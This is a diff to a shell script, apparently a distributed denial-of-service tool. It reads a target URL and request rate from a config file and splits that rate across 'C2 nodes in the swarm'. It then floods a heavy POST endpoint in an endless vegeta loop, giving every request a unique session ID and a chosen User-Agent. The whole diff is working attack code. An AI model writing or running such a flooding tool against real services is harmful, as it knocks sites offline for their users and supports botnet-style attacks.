@@ -4,8 +4,14 @@
 # vegeta cannot template dynamic values from static JSON; this script
 # reads the config and runs a Python+vegeta pipeline identical to the
 # local PoC but targeting the heavy POST endpoint.
+#
+# Usage: swarm_deploy.sh <swarm_size>
+#   swarm_size: total number of C2 nodes in the swarm.
+#   Per-node RPS = max_rps / swarm_size (aggregate stays at max_rps).
+SWARM_SIZE=${1:?"Usage: swarm_deploy.sh <swarm_size>"}
 URL=$(jq -r .target_url swarm_config.json)
-RATE=$(jq -r .max_rps swarm_config.json)
+TOTAL_RPS=$(jq -r .max_rps swarm_config.json)
+NODE_RPS=$((TOTAL_RPS / SWARM_SIZE))
 UA=$(jq -r '.headers["User-Agent"]' swarm_config.json)
 
 # Python target generator: vegeta HTTP format with unique session_id per request.
@@ -15,7 +21,7 @@ PY=$'import uuid,json,sys,signal\nsignal.signal(signal.SIGPIPE,signal.SIG_DFL)\n
 
 while true; do
   python3 -c "$PY" "$URL" "$UA" | \
-  vegeta attack -format=http -rate="$RATE" -duration=5s | \
+  vegeta attack -format=http -rate="$NODE_RPS" -duration=5s | \
   vegeta report -type=json | \
   jq -c '{rate,codes:.status_codes}'
 done
